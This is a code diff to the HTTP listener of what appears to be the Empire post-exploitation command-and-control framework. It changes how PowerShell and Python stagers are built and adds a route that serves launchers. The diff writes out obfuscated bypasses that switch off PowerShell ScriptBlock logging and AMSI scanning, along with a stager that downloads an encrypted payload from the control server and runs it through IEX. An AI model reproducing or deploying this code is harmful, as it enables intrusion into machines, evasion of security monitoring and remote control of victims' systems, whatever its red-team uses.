@@ -7,7 +7,6 @@ import time
 import copy
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
-import pdb
 # Empire imports
 from lib.common import helpers
 from lib.common import agents
@@ -106,6 +105,36 @@ class Listener:
                 'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
+            },
+            'StagerURI' : {
+                'Description'   :   'URI for the stager. Example: stager.php',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'UserAgent' : {
+                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'Proxy' : {
+                'Description'   :   'Proxy to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'ProxyCreds' : {
+                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -170,17 +199,24 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
                     # ScriptBlock Logging bypass
-                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
-                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
+                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").GetValue($null);If($GPS")
+                    stager += "['ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("){$GPS")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += helpers.randomize_capitalization("$GPS")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    stager += "'signatures','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
@@ -188,6 +224,7 @@ class Listener:
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
@@ -223,7 +260,7 @@ class Listener:
                             password = proxyCreds.split(':')[1]
                             domain = username.split('\\')[0]
                             usr = username.split('\\')[1]
-                            stager += "$netcred = New-Object System.Net.NetworkCredential("+usr+","+password+","+domain+");"
+                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
@@ -239,7 +276,7 @@ class Listener:
                         if "https" in host:
                             host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                         else:
-                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -276,9 +313,9 @@ class Listener:
 
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
-                
+
                 if obfuscate:
-                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -318,7 +355,7 @@ class Listener:
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-                
+
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
@@ -332,7 +369,7 @@ class Listener:
                         #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                         launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
 
-                
+
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
                         launcherBase += "proxy = urllib2.ProxyHandler();\n"
@@ -347,7 +384,7 @@ class Listener:
                             launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
-                            launcherBase += "proxy_auth_handler.add_password(None,"+proxy+","+username+","+password+");\n"
+                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
                             launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                     else:
                         launcherBase += "o = urllib2.build_opener(proxy);\n"
@@ -358,7 +395,7 @@ class Listener:
                 launcherBase += "urllib2.install_opener(o);\n"
 
                 # download the stager and extract the IV
-                
+
                 launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
@@ -400,11 +437,13 @@ class Listener:
             print helpers.color('[!] listeners/http generate_stager(): no language specified!')
             return None
 
+
         profile = listenerOptions['DefaultProfile']['Value']
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         launcher = listenerOptions['Launcher']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        killDate = listenerOptions['KillDate']['Value']
         host = listenerOptions['Host']['Value']
         customHeaders = profile.split('|')[2:]
 
@@ -432,6 +471,10 @@ class Listener:
             if workingHours != "":
                 stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
+            #Patch in the killdate, if any
+            if killDate != "":
+                stager = stager.replace('REPLACE_KILLDATE', killDate)
+
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
@@ -449,7 +492,7 @@ class Listener:
                         randomizedStager += helpers.randomize_capitalization(line)
                     else:
                         randomizedStager += line
-            
+
             if obfuscate:
                 randomizedStager = helpers.obfuscate(randomizedStager, obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
@@ -472,6 +515,12 @@ class Listener:
 
             if host.endswith("/"):
                 host = host[0:-1]
+
+            if workingHours != "":
+                stager = stager.replace('SET_WORKINGHOURS', workingHours)
+
+            if killDate != "":
+                stager = stager.replace('SET_KILLDATE', killDate)
 
             # # patch the server and key information
             stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
@@ -606,7 +655,7 @@ class Listener:
                                 if($Script:Proxy) {
                                     $wc.Proxy = $Script:Proxy;
                                 }
-                                
+
                                 $wc.Headers.Add("User-Agent",$script:UserAgent)
                                 $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
                                 $wc.Headers.Add("Cookie", "session=$RoutingCookie")
@@ -648,7 +697,7 @@ class Listener:
                                 if($Script:Proxy) {
                                     $wc.Proxy = $Script:Proxy;
                                 }
-                                
+
                                 $wc.Headers.Add('User-Agent', $Script:UserAgent)
                                 $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -742,10 +791,23 @@ def send_message(packets=None):
         host = listenerOptions['Host']['Value']
         port = listenerOptions['Port']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
+        stagerURI = listenerOptions['StagerURI']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        listenerName = self.options['Name']['Value']
+        proxy = self.options['Proxy']['Value']
+        proxyCreds = self.options['ProxyCreds']['Value']
 
         app = Flask(__name__)
         self.app = app
 
+
+        @app.route('/<string:stagerURI>')
+        def send_stager(stagerURI):
+            if stagerURI:
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                return launcher
+            else:
+                pass
         @app.before_request
         def check_ip():
             """
